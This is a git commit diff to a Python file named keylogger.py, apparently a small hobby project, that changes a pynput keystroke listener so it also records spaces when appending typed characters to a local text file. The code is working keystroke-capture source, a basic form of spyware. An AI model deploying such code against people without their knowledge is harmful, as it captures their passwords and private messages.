7d35d88e0b74137df236e4bf9ce4e00e6408ee78
Ashvin <ashvinjangid10@gmail.com>
2024-08-14 12:49:23 +0530

    also records the space

--- keylogger.py
+++ keylogger.py
@@ -1,13 +1,16 @@
 from pynput import keyboard
 
 def on_press(key):
-    try:
-        with open("./file.txt", "a", encoding="UTF-8") as output_file:
-            output_file.write(key.char)
-    except AttributeError:
-        if key == keyboard.Key.esc:
-            # Stop listener
-            return False
+        try:
+            with open("./file.txt", "a", encoding="UTF-8") as output_file:
+                if key == keyboard.Key.space:
+                    output_file.write(" ")
+                else:
+                    output_file.write(key.char)
+        except AttributeError:
+            if key == keyboard.Key.esc:
+                # Stop listener
+                return False
 
 # Collect events until released
 with keyboard.Listener(on_press=on_press) as listener:
